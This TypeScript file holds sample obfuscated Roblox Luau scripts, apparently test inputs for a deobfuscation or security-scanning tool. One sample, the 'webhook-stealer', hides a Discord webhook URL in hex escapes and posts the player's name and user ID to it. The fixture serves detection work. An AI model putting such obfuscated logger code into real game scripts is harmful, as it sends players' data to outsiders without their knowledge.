/**
 * Realistic Obfuscated Luau / Lua Sample Scripts for Testing
 */

import { ScriptSample } from '../../types';

export const SAMPLES: ScriptSample[] = [
  {
    id: 'roblox-gui',
    name: 'Roblox UI Char-Code & Escape Packer',
    category: 'String Encryption',
    description: 'Packed strings using \\x escapes, string.char(), and concatenated bytecode fragments.',
    code: `--[[
    Luau Obfuscator v3.4 - Protected Output
    Target: Roblox Client Script
--]]

local _0x4f8a = string.char(103, 97, 109, 101)
local _0x12b9 = string.char(80, 108, 97, 121, 101, 114, 115)
local _0x89ef = "\\x4c\\x6f\\x63\\x61\\x6c\\x50\\x6c\\x61\\x79\\x65\\x72"

if 1 == 1 then
    local _0x90a1 = _G[_0x4f8a]:GetService(_0x12b9)
    local _0xbb72 = _0x90a1[_0x89ef]

    local function _0xproxy(a, b)
        return a .. b
    end

    local _0xtitle = _0xproxy("\\x57\\x65\\x6c\\x63\\x6f\\x6d\\x65\\x20", _0xbb72.Name)

    if not false then
        local _0xscreenGui = Instance.new(string.char(83, 99, 114, 101, 101, 110, 71, 117, 105))
        _0xscreenGui.Name = "CustomNotificationUI"
        _0xscreenGui.Parent = _0xbb72:WaitForChild(string.char(80, 108, 97, 121, 101, 114, 71, 117, 105))

        local _0xlabel = Instance.new("TextLabel")
        _0xlabel.Size = UDim2.new(0, (100 * 2) + 50, 0, (20 + 30))
        _0xlabel.Position = UDim2.new(0.5, -125, 0.1, 0)
        _0xlabel.Text = _0xtitle
        _0xlabel.Parent = _0xscreenGui
    else
        -- Unreachable dead branch
        print("This should be pruned by deobfuscator")
    end
end`
  },
  {
    id: 'table-lookup',
    name: 'Luraph-style Table Lookup & Proxies',
    category: 'Table Lookup',
    description: 'String pool tables, dispatcher wrappers, and bracket index resolution.',
    code: `local LPH_STRINGS = {
    [1] = "game",
    [2] = "Workspace",
    [3] = "Part",
    [4] = "Anchored",
    [5] = "CanCollide",
    [6] = "BrickColor",
    [7] = "Bright red",
    [8] = "CFrame",
    [9] = "SpawnLocation"
}

local function LPH_ADD(a, b)
    return a + b
end

local function LPH_GET(t, k)
    return t[k]
end

local function LPH_EQ(a, b)
    return a == b
end

do
    local _workspace = _G[LPH_STRINGS[1]][LPH_STRINGS[2]]
    local _spawn = _workspace:FindFirstChild(LPH_STRINGS[9])

    if LPH_EQ(10 * 2, 20) then
        local newPart = Instance.new(LPH_STRINGS[3])
        newPart[LPH_STRINGS[4]] = true
        newPart[LPH_STRINGS[5]] = false
        newPart[LPH_STRINGS[6]] = BrickColor.new(LPH_STRINGS[7])
        newPart.Size = Vector3.new(LPH_ADD(2, 2), 1, 4)
        newPart.Parent = _workspace
    end
end`
  },
  {
    id: 'webhook-stealer',
    name: 'Security Test: Obfuscated Webhook Logger',
    category: 'Malware / Stealer',
    description: 'Detects hidden Discord webhooks, HTTP requests, and credential grabber signatures.',
    code: `-- Suspicious Roblox script sample for security scanning
local _0xhttp = game:GetService(string.char(72, 116, 116, 112, 83, 101, 114, 118, 105, 99, 101))
local _0xplayer = game:GetService("Players").LocalPlayer

local _0xpart1 = "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x64\\x69\\x73\\x63\\x6f\\x72\\x64\\x2e\\x63\\x6f\\x6d"
local _0xpart2 = "\\x2f\\x61\\x70\\x69\\x2f\\x77\\x65\\x62\\x68\\x6f\\x6f\\x6b\\x73\\x2f\\x31\\x32\\x33\\x34\\x35\\x36\\x2f\\x61\\x62\\x63\\x64\\x65\\x66"

local _0xwebhookUrl = _0xpart1 .. _0xpart2

local _0xpayload = {
    ["username"] = "Roblox Account Logger",
    ["content"] = "Captured Player: " .. _0xplayer.Name .. " | UserId: " .. tostring(_0xplayer.UserId)
}

if true then
    -- Transmit to external server
    _0xhttp:PostAsync(_0xwebhookUrl, _0xhttp:JSONEncode(_0xpayload))
    print("Execution complete")
end`
  },
  {
    id: 'barcode-ironbrew',
    name: 'Barcode Variable Scrambler (IronBrew style)',
    category: 'Control Flow',
    description: 'Il1 barcode variable identifiers, bit32 math, and opaque branching.',
    code: `local IlIlIIlIl1 = 100
local IIlllIIll1 = 250
local l1l1lllIlI = bit32.bxor(IlIlIIlIl1, 50)

local function IIlIIlIlll(IlI1, lIl1)
    return IlI1 + lIl1
end

if not not true then
    local Il1l1l1l = IIlIIlIlll(IlIlIIlIl1, IIlllIIll1)
    local lIlllIlI = string.char(84, 101, 115, 116, 32, 83, 117, 99, 99, 101, 115, 115)
    
    if 5 > 2 then
        print(lIlllIlI .. ": " .. tostring(Il1l1l1l))
    else
        print("Never reached branch")
    end
end`
  },
  {
    id: 'xor-encryptor',
    name: 'XOR Byte Stream & Math Constant Folder',
    category: 'Roblox Executor',
    description: 'XOR decoded byte calls and multi-layer mathematical simplifications.',
    code: `-- XOR encoded string evaluation
local str1 = string.char(bit32.bxor(104, 32), bit32.bxor(101, 32), bit32.bxor(108, 32), bit32.bxor(108, 32), bit32.bxor(111, 32))
local str2 = string.char(119, 111, 114, 108, 100)

local message = str1 .. " " .. str2

local health = (50 * 2) - (10 + 10)
local maxHealth = math.floor(100.95)

if health <= maxHealth and true then
    print(string.upper(message) .. " | HP: " .. tostring(health) .. "/" .. tostring(maxHealth))
end`
  }
];
